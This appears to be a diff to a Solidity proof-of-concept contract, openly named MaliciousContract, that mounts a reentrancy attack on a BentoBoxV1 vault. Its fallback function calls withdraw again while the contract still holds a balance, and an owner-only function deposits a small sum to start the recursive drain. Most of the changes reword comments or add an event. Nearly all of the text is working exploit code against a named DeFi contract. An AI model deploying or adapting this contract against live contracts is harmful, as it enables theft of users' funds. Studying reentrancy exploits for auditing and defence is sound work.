@@ -12,20 +12,22 @@ contract MaliciousContract {
     event WithdrawExecuted(uint256 amount);
     event BalanceBeforeAttack(uint256 balance);
 
+    // Make _targetContract a payable address
     constructor(address payable _targetContract) public {
         owner = msg.sender;
         targetContract = BentoBoxV1(_targetContract);
     }
 
-    // Explicitly add a receive function to handle incoming Ether
+    // Receive function to handle incoming Ether
     receive() external payable {}
 
     fallback() external payable {
         uint256 balance = targetContract.balanceOf(IERC20(address(0)), address(this));
         if (balance > 0) {
             emit BalanceBeforeAttack(balance);
-            // Reenter withdraw to recursively exploit
+            // Attempt to withdraw in a loop to reenter the vulnerable contract
             targetContract.withdraw(IERC20(address(0)), address(this), owner, balance, 0);
+            emit WithdrawExecuted(balance);
         }
     }
 
@@ -33,10 +35,10 @@ contract MaliciousContract {
         require(msg.sender == owner, "Not the owner");
         amount = _amount;
 
-        // Deposit a small amount to initiate the attack
+        // Deposit small initial amount to initiate the attack
         targetContract.deposit{value: amount}(IERC20(address(0)), address(this), address(this), amount, 0);
 
-        // Now initiate the reentrant withdrawal attack
+        // Reenter the target contract by calling withdraw repeatedly
         targetContract.withdraw(IERC20(address(0)), address(this), owner, amount, 0);
 
         emit AttackExecuted(amount);
